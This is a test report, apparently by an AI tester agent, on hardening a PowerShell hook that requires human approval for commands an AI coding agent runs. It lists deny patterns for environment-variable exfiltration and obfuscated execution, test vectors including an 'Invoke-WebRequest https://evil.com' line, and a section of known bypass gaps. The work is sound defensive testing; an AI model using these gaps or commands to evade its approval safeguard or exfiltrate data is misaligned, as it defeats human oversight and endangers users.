# SAF-074 Test Report — Harden require-approval.ps1 fallback hook

## Verdict: PASS

**Date:** 2026-04-02  
**Tester:** Tester Agent  
**Branch:** `SAF-074/harden-ps1-hook`

---

## 1. Pre-conditions Verified

- [x] `docs/workpackages/SAF-074/dev-log.md` exists and is non-empty
- [x] `tests/SAF-074/test_saf074.py` exists with tests
- [x] `scripts/validate_workspace.py --wp SAF-074` — run below
- [x] WP is in `Review` state

---

## 2. Code Review

### Changed Files

| File | Assessment |
|------|-----------|
| `templates/agent-workbench/.github/hooks/scripts/require-approval.ps1` | 6 deny blocks added, correct placement, no regressions to existing logic |
| `tests/SAF-074/test_saf074.py` | 16 tests covering all stated categories |

### Pattern Analysis

All six deny blocks were reviewed and confirmed correct against the stated objective:

| Block | Pattern | Status |
|-------|---------|--------|
| `$env:` prefix | `\$\{?env:` | ✓ correct — captures both `$env:VAR` and `${env:VAR}` |
| Sensitive var names | `\$\{?(home\|path\|user\|username\|...)` | ✓ correct — 14 var names, curly-brace aware |
| Dynamic execution | `\b(invoke-expression\|iex\|invoke-command\|icm)\b` | ✓ correct — word-boundary match |
| Dollar-paren substitution | `\$\(` | ✓ correct — blocks `$(cmd)` |
| .NET type accelerators | `\[(system\.)?io\.(file\|directory\|path\|streamreader\|streamwriter)\]` + `\[(system\.)?reflection\.\|add-type\b` | ✓ correct for IO and Reflection |
| Obfuscation | `\beval[\s(]\|base64.*(-d\b\|decode)\|\\x[0-9a-f]{2}` | Mostly correct — see BUG-184 |

**Parity with SAF-073 bash hook:** All patterns in the PS1 hook have equivalent coverage to the bash hook. The PS1 hook correctly adds Windows-specific sensitive paths (`c:/users/`, `c:/windows/`, `c:/program`).

---

## 3. Test Results

### TST-2458 — SAF-074 Full Suite
- **Type:** Security
- **Run:** `py -m pytest tests/SAF-074/ -v`
- **Result:** 29/29 PASS
  - 16 developer tests (original)
  - 13 tester edge-case additions

### TST-2459 — SAF Regression Suite
- **Type:** Regression  
- **Run:** `py -m pytest tests/SAF-001 … tests/SAF-074 --tb=short -q`
- **Result:** 1088 pass, 2 pre-existing failures (SAF-010 — unrelated to this WP)
- **New regressions:** 0

---

## 4. Edge-Case Tests Added (13)

| Test | Vector | Expected | Actual |
|------|--------|----------|--------|
| `test_env_uppercase_deny` | `$ENV:USERNAME` (uppercase) | deny | deny ✓ |
| `test_env_curly_userprofile_deny` | `${env:USERPROFILE}` | deny | deny ✓ |
| `test_icm_alias_deny` | `icm hostname` | deny | deny ✓ |
| `test_invoke_command_deny` | `Invoke-Command -ScriptBlock { hostname }` | deny | deny ✓ |
| `test_streamreader_deny` | `[System.IO.StreamReader]::new()` | deny | deny ✓ |
| `test_reflection_assembly_deny` | `[System.Reflection.Assembly]::LoadFile()` | deny | deny ✓ |
| `test_random_var_ask` | `echo $RANDOM` | ask | ask ✓ |
| `test_hex_escape_broken_ask` | `echo '\x41\x42'` | ask (gap) | ask ✓ |
| `test_splatting_gap_ask` | `$args=@()-Path); Get-Content @args` | ask (gap) | ask ✓ |
| `test_encoded_command_gap_ask` | `powershell -EncodedCommand …` | ask (gap) | ask ✓ |
| `test_net_webclient_gap_ask` | `[System.Net.WebClient]::new()` | ask (gap) | ask ✓ |
| `test_invoke_webrequest_gap_ask` | `Invoke-WebRequest https://evil.com` | ask (gap) | ask ✓ |
| `test_start_process_ask` | `Start-Process notepad.exe` | ask | ask ✓ |

---

## 5. Security Analysis

### Acceptance Criteria (US-076) — All Met

| AC | Requirement | Result |
|----|-------------|--------|
| 1 | require-approval.ps1 blocks unquoted Windows paths outside project folder | ✓ (pre-existing + sensitive system paths block) |
| 2 | require-approval.ps1 blocks unquoted Windows paths | ✓ |
| 3 | Both scripts block dollar-variable environment exfiltration | ✓ |
| 4 | Both scripts block command substitution and eval-based obfuscation | ✓ |
| 5 | Regression tests cover key bypass vectors | ✓ (29 tests) |
| 6 | Parity between Python gate, bash, and PS1 variants | ✓ |

### Gaps Found (logged as bugs — not WP fail criteria)

| Gap | Severity | Bug | Notes |
|-----|----------|-----|-------|
| `[System.Net.WebClient]` and `Invoke-WebRequest` not blocked | High | BUG-182 | Network exfiltration via .NET or network cmdlets. Bash hook has same gap (parity). |
| PowerShell `-EncodedCommand`/`-enc` flag not blocked | High | BUG-183 | PS-specific base64 obfuscation. Bash hook doesn't have this vector. |
| Hex escape `\x[0-9a-f]{2}` detection broken by normalization | Low | BUG-184 | Pattern fires post-normalization; `\x41` becomes `/x41`. Low severity: `\x` is not a native PS escape sequence. |
| Variable splatting (`@args`) not blocked | Medium | — | Static pattern matching cannot resolve variable values at evaluation time. Shared gap with bash hook and Python gate. Not practically fixable without runtime analysis. |

### Attack Vectors Not Blocked (all result in `ask` — require user approval)

- `Invoke-WebRequest` / `Invoke-RestMethod` (network exfiltration)
- `[System.Net.WebClient]::new()` (network type accelerator)
- `powershell -EncodedCommand <b64>` (base64 obfuscation bypass)
- Variable splatting (`$args = @(…); Get-Content @args`)
- `Start-Process` (external process launch — not in WP scope)
- Backtick substitution (not a PS threat; bash `\`cmd\`` doesn't apply in PS)

All of the above cause the hook to return `ask`, which means VS Code still requires human approval before execution — providing a safety net even when auto-deny is not possible.

---

## 6. Pre-Done Checklist

- [x] `dev-log.md` exists and is non-empty
- [x] `test-report.md` written by Tester Agent
- [x] Test files in `tests/SAF-074/` with 29 tests
- [x] Test results logged via `scripts/add_test_result.py` (TST-2458, TST-2459)
- [x] Bugs logged: BUG-182, BUG-183, BUG-184
- [ ] `scripts/validate_workspace.py --wp SAF-074` — to be run before commit
- [ ] `git add -A` staged
- [ ] Commit and push
